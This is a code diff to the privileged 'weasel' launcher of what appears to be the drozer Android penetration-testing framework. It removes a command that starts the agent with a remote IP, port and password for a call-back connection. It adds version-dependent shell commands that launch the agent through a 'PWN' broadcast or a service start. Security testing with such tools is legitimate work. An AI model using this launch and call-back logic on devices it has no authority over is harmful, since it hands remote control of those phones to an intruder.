@@ -32,11 +32,28 @@ bool privileged_weasel()
         sprintf(pmCommand, pmString, dir);
         system(pmCommand);
         
-        /* Start drozer - maybe replace this with something that recreates `am` because some Android 2.1 devices have a very limited version of `am` */
-        const char* amString = "am startservice -n com.mwr.droidhg.agent/.services.ClientService -e %s --ei port %d --ez ssl false -e ssl-truststore-path none -e ssl-truststore-password none -e password weasel > /dev/null 2>&1";
-        char* amCommand = malloc(strlen(amString) - 4 + strlen(ip) + 5 + 1);
-        sprintf(amCommand, amString, ip, port);
-        system(amCommand);    
+        /* Get SDK version from SystemProperties */
+        char sdkVersionStr[4];
+        long sdkVersionLong;
+        property_get("ro.build.version.sdk", sdkVersionStr, NULL);
+        sdkVersionLong = strtol(sdkVersionStr, NULL, 10);
+
+        /* Check if device is running Android 3.0.x or less */
+        if (sdkVersionLong <= 11)
+        {
+            /* Start drozer by sending a broadcast */
+            const char* amBroadcast = "am broadcast -a com.mwr.dz.PWN";
+            system(amBroadcast);
+            debug("weasel", "Starting method - sent broadcast");
+        }
+        else
+        {
+             /* Start drozer by invoking the service */
+            const char* amService = "am startservice -n com.mwr.dz/.Agent";
+            system(amService);
+            debug("weasel", "Starting method - invoked service");
+        }
+       
     }
     
     return drozerInstalled();
